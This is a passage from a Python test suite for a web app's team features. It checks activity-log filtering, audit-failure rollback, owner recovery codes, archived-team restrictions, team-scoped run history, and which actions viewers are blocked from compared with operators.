            event_json = json.dumps(owner_payload["events"])
            assert admin_member["id"] in event_json
            assert viewer_member["id"] in event_json
            assert "tok_team_activity" not in event_json
            assert "actor_session_hash" not in event_json
            assert "team_should_not_leak" not in event_json

            actor_filtered = client.get(
                f"/session/teams/{team_id}/activity?actor=Activity%20Admin"
                "&date_from=2026-06-06&date_to=2026-06-06",
                headers={"X-Session-ID": owner_token},
            )
            assert actor_filtered.status_code == 200
            actor_payload = actor_filtered.get_json()
            assert [event["event_type"] for event in actor_payload["events"]] == [
                "notification.config_change",
                "team.role_change",
            ]
            assert {event["actor"]["display_name"] for event in actor_payload["events"]} == {"Activity Admin"}

            target_filtered = client.get(
                f"/session/teams/{team_id}/activity?target_type=notification&target_id=chn_team_activity",
                headers={"X-Session-ID": owner_token},
            )
            assert target_filtered.status_code == 200
            target_payload = target_filtered.get_json()
            assert [event["target"]["id"] for event in target_payload["events"]] == ["chn_team_activity"]
            assert target_payload["events"][0]["target"]["type"] == "notification"

            first_page = client.get(
                f"/session/teams/{team_id}/activity?event_type=team.role_change"
                "&date_from=2026-06-06&date_to=2026-06-06&limit=1",
                headers={"X-Session-ID": owner_token},
            )
            assert first_page.status_code == 200
            first_payload = first_page.get_json()
            assert first_payload["has_more"] is True
            assert [event["details"].get("to_role") for event in first_payload["events"]] == ["operator"]
            assert first_payload["limit"] == 1
            assert first_payload["offset"] == 0

            second_page = client.get(
                f"/session/teams/{team_id}/activity?event_type=team.role_change"
                "&date_from=2026-06-06&date_to=2026-06-06&limit=1&offset=1",
                headers={"X-Session-ID": owner_token},
            )
            assert second_page.status_code == 200
            second_payload = second_page.get_json()
            assert second_payload["has_more"] is False
            assert [event["details"].get("to_role") for event in second_payload["events"]] == ["admin"]
            assert second_payload["limit"] == 1
            assert second_payload["offset"] == 1

            empty_filtered = client.get(
                f"/session/teams/{team_id}/activity?actor=Missing%20Actor",
                headers={"X-Session-ID": owner_token},
            )
            assert empty_filtered.status_code == 200
            empty_payload = empty_filtered.get_json()
            assert empty_payload["events"] == []
            assert empty_payload["has_more"] is False

            admin = client.get(
                f"/session/teams/{team_id}/activity?target_type=team",
                headers={"X-Session-ID": admin_token},
            )
            assert admin.status_code == 200

            viewer = client.get(
                f"/session/teams/{team_id}/activity",
                headers={"X-Session-ID": viewer_token},
            )
            assert viewer.status_code == 403
            assert viewer.get_json()["error"] == "team_activity_forbidden"

            outsider = client.get(
                f"/session/teams/{team_id}/activity",
                headers={"X-Session-ID": outsider_token},
            )
            assert outsider.status_code == 404
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_role_change_rolls_back_when_fail_closed_audit_fails(self, tmp_path):
        from services.audit.recorder import AuditRecordError

        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_role_audit_owner"
            operator_token = "tok_team_role_audit_operator"
            self._register_session_token(operator_token)
            created = self._create_team(client, owner_token, name="Role Audit Rollback")
            team_id = created.get_json()["team"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Role rollback operator"},
            )
            assert invite.status_code == 201
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Rollback operator"},
            )
            assert joined.status_code == 201
            operator_member = next(
                item for item in joined.get_json()["members"] if item["display_name"] == "Rollback operator"
            )

            with mock.patch(
                "blueprints.teams.record_event",
                side_effect=AuditRecordError("audit unavailable"),
            ):
                promoted = client.patch(
                    f"/session/teams/{team_id}/members/{operator_member['id']}",
                    headers={"X-Session-ID": owner_token},
                    json={"role": "admin"},
                )

            assert promoted.status_code == 500
            assert promoted.get_json()["error"] == "team_route_failed"
            detail = client.get(f"/session/teams/{team_id}", headers={"X-Session-ID": owner_token})
            assert detail.status_code == 200
            current_member = next(
                item for item in detail.get_json()["members"] if item["id"] == operator_member["id"]
            )
            assert current_member["role"] == "operator"
            assert _audit_event_rows(target_id=team_id, event_type="team.role_change") == []
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_owner_guard_and_recovery_redeem(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_recovery_owner"
            recovery_token = "tok_team_recovery_second"
            late_recovery_token = "tok_team_recovery_late"
            self._register_session_token(recovery_token)
            self._register_session_token(late_recovery_token)
            created = self._create_team(client, owner_token)
            payload = created.get_json()
            team_id = payload["team"]["id"]
            owner_member_id = payload["team"]["member"]["id"]
            recovery_code = payload["recovery_code"]

            blocked_leave = client.post(
                f"/session/teams/{team_id}/leave",
                headers={"X-Session-ID": owner_token},
                json={},
            )
            assert blocked_leave.status_code == 409
            assert blocked_leave.get_json()["error"] == "team_owner_required"

            blocked_self_demote = client.patch(
                f"/session/teams/{team_id}/members/{owner_member_id}",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator"},
            )
            assert blocked_self_demote.status_code == 409
            assert blocked_self_demote.get_json()["error"] == "team_owner_required"

            redeemed = client.post(
                "/session/teams/recovery/redeem",
                headers={"X-Session-ID": recovery_token},
                json={"code": recovery_code, "display_name": "Second owner"},
            )
            assert redeemed.status_code == 200
            second_owner = next(item for item in redeemed.get_json()["members"] if item["display_name"] == "Second owner")
            assert second_owner["role"] == "owner"

            late_redeem = client.post(
                "/session/teams/recovery/redeem",
                headers={"X-Session-ID": late_recovery_token},
                json={"code": recovery_code, "display_name": "Late owner"},
            )
            assert late_redeem.status_code == 400
            assert late_redeem.get_json()["message"] == "Recovery code is not active"

            allowed_self_demote = client.patch(
                f"/session/teams/{team_id}/members/{owner_member_id}",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator"},
            )
            assert allowed_self_demote.status_code == 200
            assert allowed_self_demote.get_json()["member"]["role"] == "operator"

            leave = client.post(
                f"/session/teams/{team_id}/leave",
                headers={"X-Session-ID": owner_token},
                json={},
            )
            assert leave.status_code == 200
            assert leave.get_json()["removed"] is True

            blocked_second_leave = client.post(
                f"/session/teams/{team_id}/leave",
                headers={"X-Session-ID": recovery_token},
                json={},
            )
            assert blocked_second_leave.status_code == 409
            assert blocked_second_leave.get_json()["error"] == "team_owner_required"
            audit_rows = _audit_event_rows(target_id=team_id)
            assert [row["event_type"] for row in audit_rows] == [
                "team.create",
                "team.recovery_redeem",
                "team.role_change",
                "team.leave",
            ]
            assert audit_rows[1]["details"]["kind"] == "recovery"
            assert audit_rows[1]["details"]["target_member_id"] == second_owner["id"]
            assert audit_rows[2]["details"]["from_role"] == "owner"
            assert audit_rows[2]["details"]["to_role"] == "operator"
            assert audit_rows[3]["details"]["target_member_id"] == owner_member_id
            assert recovery_code not in json.dumps(audit_rows)
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_recovery_rotate_rolls_back_when_fail_closed_audit_fails(self, tmp_path):
        from services.audit.recorder import AuditRecordError

        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_recovery_audit_owner"
            created = self._create_team(client, owner_token, name="Recovery Audit Rollback")
            team_id = created.get_json()["team"]["id"]
            with db_connect() as conn:
                before_rows = conn.execute(
                    "SELECT id, rotated_at, revoked_at, used_at FROM team_recovery_codes "
                    "WHERE team_id = ? ORDER BY created_at",
                    (team_id,),
                ).fetchall()
            assert len(before_rows) == 1
            original_recovery_id = before_rows[0]["id"]
            assert before_rows[0]["rotated_at"] == ""

            with mock.patch(
                "blueprints.teams.record_event",
                side_effect=AuditRecordError("audit unavailable"),
            ):
                rotated = client.post(
                    f"/session/teams/{team_id}/recovery/rotate",
                    headers={"X-Session-ID": owner_token},
                )

            assert rotated.status_code == 500
            assert rotated.get_json()["error"] == "team_route_failed"
            with db_connect() as conn:
                after_rows = conn.execute(
                    "SELECT id, rotated_at, revoked_at, used_at FROM team_recovery_codes "
                    "WHERE team_id = ? ORDER BY created_at",
                    (team_id,),
                ).fetchall()
            assert len(after_rows) == 1
            assert after_rows[0]["id"] == original_recovery_id
            assert after_rows[0]["rotated_at"] == ""
            assert after_rows[0]["revoked_at"] == ""
            assert after_rows[0]["used_at"] == ""
            assert _audit_event_rows(target_id=team_id, event_type="team.recovery_rotate") == []
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_archived_team_rejects_invite_and_recovery_redeem(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_archived_owner"
            invited_token = "tok_team_archived_invited"
            recovery_token = "tok_team_archived_recovery"
            self._register_session_token(invited_token)
            self._register_session_token(recovery_token)
            created = self._create_team(client, owner_token, name="Archived Operators")
            payload = created.get_json()
            team_id = payload["team"]["id"]
            recovery_code = payload["recovery_code"]
            project_created = client.post(
                "/projects",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"name": "Archived Auto Promote"},
            )
            project_id = project_created.get_json()["project"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Archived invite"},
            )
            invite_code = invite.get_json()["invite"]["code"]
            archived = client.patch(
                f"/session/teams/{team_id}",
                headers={"X-Session-ID": owner_token},
                json={"status": "archived"},
            )

            invited_join = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": invited_token},
                json={"code": invite_code, "display_name": "Late operator"},
            )
            recovery_join = client.post(
                "/session/teams/recovery/redeem",
                headers={"X-Session-ID": recovery_token},
                json={"code": recovery_code, "display_name": "Late owner"},
            )
            scoped_run = client.post(
                "/runs",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"command": "echo archived"},
            )
            blocked_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Blocked archived invite"},
            )
            blocked_recovery_rotate = client.post(
                f"/session/teams/{team_id}/recovery/rotate",
                headers={"X-Session-ID": owner_token},
            )
            blocked_auto_rule = client.post(
                f"/projects/{project_id}/auto-promote-rules",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={
                    "name": "Blocked archived rule",
                    "target_entity_kind": "domain",
                    "match_mode": "exact",
                    "pattern": "archived.example",
                },
            )

            assert created.status_code == 201
            assert project_created.status_code == 201
            assert invite.status_code == 201
            assert archived.status_code == 200
            assert scoped_run.status_code == 409
            assert scoped_run.get_json()["error"] == "team_archived"
            assert "archived" in scoped_run.get_json()["message"]
            assert blocked_invite.status_code == 409
            assert blocked_invite.get_json()["error"] == "team_archived"
            assert "archived" in blocked_invite.get_json()["message"]
            assert blocked_recovery_rotate.status_code == 409
            assert blocked_recovery_rotate.get_json()["error"] == "team_archived"
            assert "archived" in blocked_recovery_rotate.get_json()["message"]
            assert blocked_auto_rule.status_code == 409
            assert blocked_auto_rule.get_json()["error"] == "team_archived"
            assert "archived" in blocked_auto_rule.get_json()["message"]
            assert invited_join.status_code == 409
            assert invited_join.get_json()["error"] == "team_archived"
            assert "archived" in invited_join.get_json()["message"]
            assert recovery_join.status_code == 409
            assert recovery_join.get_json()["error"] == "team_archived"
            assert "archived" in recovery_join.get_json()["message"]
            from services.teams.storage import token_hash
            with db_connect() as conn:
                invited_member = conn.execute(
                    "SELECT 1 FROM team_members WHERE team_id = ? AND session_token_hash = ?",
                    (team_id, token_hash(invited_token)),
                ).fetchone()
                recovery_member = conn.execute(
                    "SELECT 1 FROM team_members WHERE team_id = ? AND session_token_hash = ?",
                    (team_id, token_hash(recovery_token)),
                ).fetchone()
                invite_row = conn.execute(
                    "SELECT use_count FROM team_invites WHERE team_id = ?",
                    (team_id,),
                ).fetchone()
                recovery_row = conn.execute(
                    "SELECT used_at FROM team_recovery_codes WHERE team_id = ?",
                    (team_id,),
                ).fetchone()
            assert invited_member is None
            assert recovery_member is None
            assert invite_row["use_count"] == 0
            assert recovery_row["used_at"] == ""
            reactivated = client.patch(
                f"/session/teams/{team_id}",
                headers={"X-Session-ID": owner_token},
                json={"status": "active"},
            )
            assert reactivated.status_code == 200
            assert reactivated.get_json()["team"]["status"] == "active"
            audit_rows = _audit_event_rows(target_id=team_id)
            assert [row["event_type"] for row in audit_rows] == [
                "team.create",
                "team.invite",
                "team.archive",
                "team.reactivate",
            ]
            assert audit_rows[2]["details"]["status"] == "archived"
            assert "paused_watchers" in audit_rows[2]["details"]
            assert audit_rows[3]["details"]["status"] == "active"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_isolates_history_runs_and_recent_values(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_scope_owner"
            outsider_token = "tok_team_scope_outsider"
            self._register_session_token(outsider_token)
            created = self._create_team(client, owner_token, name="Scope Operators")
            team_id = created.get_json()["team"]["id"]
            personal_run_id = "run-team-scope-personal"
            team_run_id = "run-team-scope-team"

            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, '', 'external', 'echo personal', ?, ?, 0, ?, 1, 'personal output')",
                    (
                        personal_run_id,
                        owner_token,
                        "2026-05-28T10:00:00+00:00",
                        "2026-05-28T10:00:01+00:00",
                        json.dumps([{"text": "personal output", "cls": "", "tsC": "", "tsE": ""}]),
                    ),
                )
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, ?, 'external', 'echo team', ?, ?, 0, ?, 1, 'team output')",
                    (
                        team_run_id,
                        owner_token,
                        team_id,
                        "2026-05-28T10:01:00+00:00",
                        "2026-05-28T10:01:01+00:00",
                        json.dumps([{"text": "team output", "cls": "", "tsC": "", "tsE": ""}]),
                    ),
                )
                conn.commit()

            personal_history = client.get("/history?type=runs", headers={"X-Session-ID": owner_token})
            team_history = client.get(
                "/history?type=runs",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
            )
            outsider_history = client.get(
                "/history?type=runs",
                headers={"X-Session-ID": outsider_token, "X-Team-ID": team_id},
            )
            personal_permalink = client.get(
                f"/history/{team_run_id}?json",
                headers={"X-Session-ID": owner_token},
            )
            team_detail = client.get(
                f"/history/{team_run_id}?json",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
            )

            assert personal_history.status_code == 200
            personal_ids = {item["id"] for item in json.loads(personal_history.data)["runs"]}
            assert personal_run_id in personal_ids
            assert team_run_id not in personal_ids
            assert team_history.status_code == 200
            team_ids = {item["id"] for item in json.loads(team_history.data)["runs"]}
            assert team_run_id in team_ids
            assert personal_run_id not in team_ids
            assert outsider_history.status_code == 403
            assert outsider_history.get_json()["error"] == "team_forbidden"
            assert personal_permalink.status_code == 200
            assert personal_permalink.get_json()["id"] == team_run_id
            assert personal_permalink.get_json()["label_count"] == 0
            assert team_detail.status_code == 200
            assert team_detail.get_json()["id"] == team_run_id

            personal_recent = client.post(
                "/session/recent-values",
                headers={"X-Session-ID": owner_token},
                json={"values": [{"kind": "domain", "value": "personal.example"}]},
            )
            team_recent = client.post(
                "/session/recent-values",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"values": [{"kind": "domain", "value": "team.example"}]},
            )
            assert personal_recent.status_code == 200
            assert team_recent.status_code == 200
            assert client.get(
                "/session/recent-values?kind=domain",
                headers={"X-Session-ID": owner_token},
            ).get_json()["values"]["domain"] == ["personal.example"]
            assert client.get(
                "/session/recent-values?kind=domain",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
            ).get_json()["values"]["domain"] == ["team.example"]

            saved = client.post(
                "/run/client",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={
                    "command": "theme list",
                    "exit_code": 0,
                    "lines": [{"text": "Theme output", "cls": ""}],
                },
            )
            saved_id = saved.get_json()["run_id"]
            with db_connect() as conn:
                saved_row = conn.execute(
                    "SELECT team_id FROM runs WHERE id = ?",
                    (saved_id,),
                ).fetchone()
            assert saved.status_code == 200
            assert saved_row["team_id"] == team_id
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_history_bulk_delete_and_clear_respect_active_team_scope(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_clear_owner"
            viewer_token = "tok_team_clear_viewer"
            self._register_session_token(viewer_token)
            created = self._create_team(client, owner_token, name="History Clear Operators")
            team_id = created.get_json()["team"]["id"]
            viewer_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "viewer", "label": "History viewer"},
            )
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": viewer_token},
                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
            ).status_code == 201
            personal_bulk_id = "run-team-history-personal-bulk"
            personal_clear_id = "run-team-history-personal-clear"
            team_bulk_id = "run-team-history-team-bulk"
            team_clear_id = "run-team-history-team-clear"
            now = "2026-05-29T10:00:00+00:00"
            with db_connect() as conn:
                rows = [
                    (personal_bulk_id, owner_token, "", "echo personal bulk"),
                    (personal_clear_id, owner_token, "", "echo personal clear"),
                    (team_bulk_id, owner_token, team_id, "echo team bulk"),
                    (team_clear_id, owner_token, team_id, "echo team clear"),
                ]
                for run_id, session_id, run_team_id, command in rows:
                    conn.execute(
                        "INSERT INTO runs "
                        "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                        "output_preview, output_line_count) "
                        "VALUES (?, ?, ?, 'external', ?, ?, ?, 0, ?, 1)",
                        (
                            run_id,
                            session_id,
                            run_team_id,
                            command,
                            now,
                            now,
                            json.dumps([{"text": command, "cls": "", "tsC": "", "tsE": ""}]),
                        ),
                    )
                conn.commit()

            viewer_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}
            viewer_single = client.delete(f"/history/{team_bulk_id}", headers=viewer_headers)
            viewer_bulk = client.post(
                "/history/bulk-delete",
                headers=viewer_headers,
                json={"run_ids": [team_bulk_id]},
            )
            viewer_snapshot = client.post(
                "/share",
                headers=viewer_headers,
                json={
                    "label": "viewer snapshot",
                    "content": [{"text": "blocked", "cls": ""}],
                    "apply_redaction": True,
                },
            )
            viewer_clear = client.delete("/history", headers=viewer_headers)
            personal_bulk = client.post(
                "/history/bulk-delete",
                headers={"X-Session-ID": owner_token},
                json={"run_ids": [personal_bulk_id, team_bulk_id]},
            )
            personal_clear = client.delete("/history", headers={"X-Session-ID": owner_token})
            team_bulk = client.post(
                "/history/bulk-delete",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                json={"run_ids": [team_bulk_id, personal_clear_id]},
            )
            team_clear = client.delete(
                "/history",
                headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
            )

            assert viewer_single.status_code == 403
            assert viewer_single.get_json()["error"] == "team_forbidden"
            assert viewer_bulk.status_code == 403
            assert viewer_bulk.get_json()["error"] == "team_forbidden"
            assert viewer_snapshot.status_code == 403
            assert viewer_snapshot.get_json()["error"] == "team_forbidden"
            assert viewer_clear.status_code == 403
            assert viewer_clear.get_json()["error"] == "team_forbidden"
            assert personal_bulk.status_code == 200
            assert personal_bulk.get_json()["counts"] == {"deleted": 1, "not_found": 1, "rejected": 0}
            assert personal_bulk.get_json()["results"] == [
                {"run_id": personal_bulk_id, "status": "deleted"},
                {"run_id": team_bulk_id, "status": "not_found"},
            ]
            assert personal_clear.status_code == 200
            assert personal_clear.get_json()["ok"] is True
            assert team_bulk.status_code == 200
            assert team_bulk.get_json()["counts"] == {"deleted": 1, "not_found": 1, "rejected": 0}
            assert team_bulk.get_json()["results"] == [
                {"run_id": team_bulk_id, "status": "deleted"},
                {"run_id": personal_clear_id, "status": "not_found"},
            ]
            assert team_clear.status_code == 200
            assert team_clear.get_json()["ok"] is True
            with db_connect() as conn:
                remaining = {
                    row["id"]
                    for row in conn.execute(
                        "SELECT id FROM runs WHERE id IN (?, ?, ?, ?)",
                        (personal_bulk_id, personal_clear_id, team_bulk_id, team_clear_id),
                    ).fetchall()
                }
                snapshot = conn.execute(
                    "SELECT id FROM snapshots WHERE label = ?",
                    ("viewer snapshot",),
                ).fetchone()
            assert remaining == set()
            assert snapshot is None
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_viewers_cannot_run_commands_or_mutate_projects_and_findings(self, monkeypatch, tmp_path):
        from blueprints import run as run_routes

        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_caps_owner"
            operator_token = "tok_team_caps_operator"
            viewer_token = "tok_team_caps_viewer"
            self._register_session_token(operator_token)
            self._register_session_token(viewer_token)
            created = self._create_team(client, owner_token, name="Capability Operators")
            team_id = created.get_json()["team"]["id"]
            operator_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Capability operator"},
            )
            viewer_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "viewer", "label": "Capability viewer"},
            )
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Operator"},
            ).status_code == 201
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": viewer_token},
                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
            ).status_code == 201

            owner_headers = {"X-Session-ID": owner_token, "X-Team-ID": team_id}
            operator_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
            viewer_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}

            project_created = client.post("/projects", headers=owner_headers, json={"name": "Capability Review"})
            project_id = project_created.get_json()["project"]["id"]
            run_id = "run-team-capability"
            entity_id = "ent_team_capability"
            finding_id = "fnd_team_capability"
            seen_at = "2026-05-28T15:00:00+00:00"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO runs "
                    "(id, session_id, team_id, run_kind, command, started, finished, exit_code, "
                    "output_preview, output_line_count, output_search_text) "
                    "VALUES (?, ?, ?, 'external', 'httpx capability.example', ?, ?, 0, '[]', 0, '')",
                    (run_id, owner_token, team_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO entities "
                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                    "VALUES (?, ?, 'domain', 'capability.example', ?, ?, ?, ?)",
                    (entity_id, owner_token, "sig_" + entity_id, seen_at, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO entity_run_links "
                    "(entity_id, run_id, first_seen_at, last_seen_at, occurrence_count) "
                    "VALUES (?, ?, ?, ?, 1)",
                    (entity_id, run_id, seen_at, seen_at),
                )
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                    "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, raw_line, created) "
                    "VALUES (?, ?, ?, ?, ?, ?, 'medium', 'finding', 'httpx', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                    (
                        finding_id,
                        owner_token,
                        run_id,
                        entity_id,
                        entity_id,
                        "sig_" + finding_id,
                        run_id,
                        run_id,
                        seen_at,
                        seen_at,
                        "capability finding",
                        "capability finding",
                        seen_at,
                    ),
                )
                conn.execute(
                    "INSERT INTO findings_occurrences (finding_id, run_id, line_number, snippet, seen_at) "
                    "VALUES (?, ?, 1, 'capability finding', ?)",
                    (finding_id, run_id, seen_at),
                )
                conn.commit()

            monkeypatch.setattr(run_routes, "broker_available", lambda: True)
            monkeypatch.setattr(
                run_routes,
                "_start_brokered_run_service",
                mock.Mock(side_effect=AssertionError("viewer should be blocked before run start")),
            )
            viewer_brokered_run = client.post("/runs", headers=viewer_headers, json={"command": "echo blocked"})
            viewer_client_run = client.post(
                "/run/client",
                headers=viewer_headers,
                json={"command": "theme list", "exit_code": 0, "lines": []},
            )
            operator_client_run = client.post(
                "/run/client",
                headers=operator_headers,
                json={"command": "theme list", "exit_code": 0, "lines": []},
            )

            viewer_project_create = client.post("/projects", headers=viewer_headers, json={"name": "Blocked"})
            viewer_project_update = client.put(
                f"/projects/{project_id}",
                headers=viewer_headers,
                json={"name": "Blocked edit"},
            )
            viewer_package_presets = client.get("/projects/package-presets", headers=viewer_headers)
            viewer_package_create = client.post(
                f"/projects/{project_id}/packages",
                headers=viewer_headers,
                json={
                    "name": "Blocked Package",
                    "preset": "evidence",
                    "selection": {"run_ids": []},
                },
            )
            viewer_active_set = client.post(
                "/projects/active",
                headers=viewer_headers,
                json={"project_id": project_id},
            )
            viewer_active_get = client.get("/projects/active", headers=viewer_headers)
            viewer_personal_switcher = client.get(
                "/projects?mode=switcher",
                headers={"X-Session-ID": viewer_token},
            )
            viewer_active_clear = client.delete("/projects/active", headers=viewer_headers)
            operator_target_create = client.post(
                f"/projects/{project_id}/targets",
                headers=operator_headers,
                json={"type": "domain", "value": "capability.example"},
            )
            viewer_target_create = client.post(
                f"/projects/{project_id}/targets",
                headers=viewer_headers,
                json={"type": "domain", "value": "blocked.example"},
            )
            operator_label_create = client.post(
                f"/entities/atlas_entity/{entity_id}/labels",
                headers=operator_headers,
                json={"label": "reviewed-by-operator"},
            )
            viewer_label_create = client.post(
                f"/entities/atlas_entity/{entity_id}/labels",
                headers=viewer_headers,
                json={"label": "blocked"},
            )
            viewer_finding_review = client.put(
                f"/findings/{finding_id}/review",
                headers=viewer_headers,
                json={"review_state": "reviewed"},
            )
            viewer_finding_triage_read = client.get(
                f"/findings/{finding_id}/triage",
                headers=viewer_headers,
            )
            operator_finding_triage_update = client.put(
                f"/findings/{finding_id}/triage",
                headers=operator_headers,
                json={"verification_status": "ready_to_verify", "remediation": "Patch capability finding."},
            )
            viewer_finding_triage_update = client.put(
                f"/findings/{finding_id}/triage",
                headers=viewer_headers,
                json={"verification_status": "verified"},
            )
            viewer_atlas_review = client.post(
                "/atlas/findings/review",
                headers=viewer_headers,
                json={"finding_ids": [finding_id], "review_state": "reviewed"},
            )
            viewer_intel_refresh = client.post(
                f"/atlas/entities/{entity_id}/refresh_intel",
                headers=viewer_headers,
                json={},
            )

            assert project_created.status_code == 201
            assert viewer_brokered_run.status_code == 403
            assert viewer_client_run.status_code == 403
            assert operator_client_run.status_code == 200
            assert viewer_project_create.status_code == 403
            assert viewer_project_update.status_code == 403
            assert viewer_package_presets.status_code == 200
            assert [item["id"] for item in viewer_package_presets.get_json()["presets"]][:4] == [
                "evidence",
                "summary",
                "full",
                "redacted",
            ]
            assert viewer_package_create.status_code == 403
            assert viewer_active_set.status_code == 200
            assert viewer_active_set.get_json()["project"]["id"] == project_id
            assert viewer_active_get.status_code == 200
            assert viewer_active_get.get_json()["project"]["id"] == project_id
            assert viewer_personal_switcher.status_code == 200
            assert project_id not in {
                project["id"] for project in viewer_personal_switcher.get_json()["projects"]
            }
            assert viewer_active_clear.status_code == 200
            assert viewer_active_clear.get_json()["cleared"] is True
            assert operator_target_create.status_code == 201
            assert viewer_target_create.status_code == 403
            assert operator_label_create.status_code == 201
            assert viewer_label_create.status_code == 403
            assert viewer_finding_review.status_code == 403
            assert viewer_finding_triage_read.status_code == 200
            assert operator_finding_triage_update.status_code == 200
            assert viewer_finding_triage_update.status_code == 403
            assert viewer_atlas_review.status_code == 403
            assert viewer_intel_refresh.status_code == 403
            assert viewer_brokered_run.get_json()["error"] == "team_forbidden"
            assert viewer_package_create.get_json()["error"] == "team_forbidden"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_viewers_can_preview_auto_promote_rules_but_not_mutate_them(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_auto_promote_owner"
            viewer_token = "tok_team_auto_promote_viewer"
            self._register_session_token(viewer_token)
            created = self._create_team(client, owner_token, name="Auto Promote Operators")
            team_id = created.get_json()["team"]["id"]
            viewer_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "viewer", "label": "Auto-promote viewer"},
            )
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": viewer_token},
                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Viewer"},
            ).status_code == 201
            owner_headers = {"X-Session-ID": owner_token, "X-Team-ID": team_id}
            viewer_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}
            project_created = client.post("/projects", headers=owner_headers, json={"name": "Auto Promote"})
            project_id = project_created.get_json()["project"]["id"]
            seen_at = "2026-05-28T15:30:00+00:00"
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO entities "
                    "(id, session_id, team_id, type, canonical_value, signature_hash, "
                    "first_seen_at, last_seen_at, created) "
                    "VALUES ('ent_team_auto_promote', ?, ?, 'domain', 'team-auto.example', "
                    "'sig_ent_team_auto_promote', ?, ?, ?)",
                    (owner_token, team_id, seen_at, seen_at, seen_at),
                )
                conn.commit()
            payload = {
                "name": "Team auto domain",
                "target_entity_kind": "domain",
                "match_mode": "exact",
                "pattern": "team-auto.example",
            }
            created_rule = client.post(
                f"/projects/{project_id}/auto-promote-rules",
                headers=owner_headers,
                json=payload,
            )
            rule_id = created_rule.get_json()["rule"]["id"]

            viewer_list = client.get(f"/projects/{project_id}/auto-promote-rules", headers=viewer_headers)
            viewer_preview = client.post(
                f"/projects/{project_id}/auto-promote-rules/preview",
                headers=viewer_headers,
                json=payload,
            )
            viewer_create = client.post(
                f"/projects/{project_id}/auto-promote-rules",
                headers=viewer_headers,
                json=payload,
            )
            viewer_update = client.put(
                f"/projects/{project_id}/auto-promote-rules/{rule_id}",
                headers=viewer_headers,
                json={**payload, "name": "Blocked"},
            )
            viewer_apply = client.post(
                f"/projects/{project_id}/auto-promote-rules/{rule_id}/apply",
                headers=viewer_headers,
            )
            viewer_delete = client.delete(
